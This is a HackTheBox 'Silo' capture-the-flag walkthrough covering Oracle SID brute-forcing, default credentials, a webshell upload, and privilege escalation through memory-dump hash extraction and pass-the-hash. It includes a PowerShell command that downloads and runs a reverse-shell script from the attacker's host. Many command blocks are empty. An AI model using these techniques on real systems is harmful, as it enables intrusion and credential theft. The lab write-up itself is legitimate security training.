---
layout: post
title: Hackthebox Silo Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-11-07/silo-badge.png)
# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
To learn a new technique/knowledge, solve all machines (As much as possible!!).<br>
This is a walkthrough of a box "Silo".<br>

# Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.82 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-06 15:58 EET
Nmap scan report for 10.10.10.82
Host is up (0.047s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2m19s, deviation: 0s, median: 2m18s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-11-06T14:51:29
|_  start_date: 2019-11-06T14:00:27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3066.66 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.82/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.aspx -s '200,204,301,302,403'
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.82/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,aspx
[+] Timeout:        10s
===============================================================
2019/11/06 16:54:45 Starting gobuster
===============================================================
===============================================================
2019/11/06 18:05:09 Finished
===============================================================
{% endhighlight %}

### 2. Getting User

Sounds we have nothing interesting on port 80 HTTP.<br>
Then, try to take a look at Oracle TNS listener.<br>
At first, try to get SIDs.<br>
<em>The Oracle System ID (SID) is used to uniquely identify a particular database on a system. For this reason, one cannot have more than one database with the same SID on a computer system.</em>
{% highlight shell %}
msf5 auxiliary(admin/oracle/sid_brute) > use auxiliary/admin/oracle/sid_brute 
msf5 auxiliary(admin/oracle/sid_brute) > set rhost 10.10.10.82
rhost => 10.10.10.82
msf5 auxiliary(admin/oracle/sid_brute) > show options

Module options (auxiliary/admin/oracle/sid_brute):

   Name     Current Setting                                         Required  Description
   ----     ---------------                                         --------  -----------
   RHOSTS   10.10.10.82                                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    1521                                                    yes       The target port (TCP)
   SIDFILE  /usr/share/metasploit-framework/data/wordlists/sid.txt  no        The file that contains a list of sids.
   SLEEP    1                                                       no        Sleep() amount between each request.

msf5 auxiliary(admin/oracle/sid_brute) > run
[*] Running module against 10.10.10.82

[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt...
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'PLSExtProc'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'CLRExtProc'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID ''
[*] 10.10.10.82:1521 - Done with brute force...
[*] Auxiliary module execution completed
{% endhighlight %}

Next, brute force the valid credentials.<br>
To set up the Oracle client on Kali, we can read <a hreh="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux">this page</a>
We can find following username/password.
{% highlight shell %}
scott:tiger
{% endhighlight %}
{% highlight shell %}

{% endhighlight %}

For the Oracle penetration testing, we can use a script "<a href="https://github.com/quentinhardy/odat">odat.py</a>".<br>
Next, try to check if we have a write permission.
{% highlight shell %}

{% endhighlight %}
{% highlight shell %}

{% endhighlight %}

Then, upload a aspx webshell which is installed on Kali linux by default.
{% highlight shell %}

{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-11-07/silo-badge.png)

To launch a netcat listener to receive a reverse shell.
{% highlight shell %}

{% endhighlight %}

For the reverse shell, we can use <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">this Powershell script</a>.<br>
To use it, we have to run following command with the webshell.
{% highlight shell %}
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/Invoke-PowerShellTcp.ps1')
{% endhighlight %}

Now we got a reverse shell.<br>
user.txt is in the directory "Directory: C:\users\Phineas\Desktop".
{% highlight shell %}

{% endhighlight %}


### 3. Getting Root

There is another file in the same directory which name is "Oracle issue.txt" with password.
{% highlight shell %}

{% endhighlight %}

Then, try to access to the dropbox.<br>
![placeholder](https://inar1.github.io/public/images/2019-11-07/silo-badge.png)

By unzip, we can get a file which contains memory dump.<br>
We can use "volatility" to do the investigation.
{% highlight shell %}

{% endhighlight %}

We found a some files should be confidential.<br>
To dump the hash, wehave to provide the needed addresses for SYSTEM and SAM.
{% highlight shell %}

{% endhighlight %}

Since we can use Pass the Hash technique for Windows,<br>
we can achieve a SYSTEM shell with following command.
{% highlight shell %}

{% endhighlight %}

As always, root.txt is in the directory "C:\Users\Administrator\Desktop".
{% highlight shell %}

{% endhighlight %}
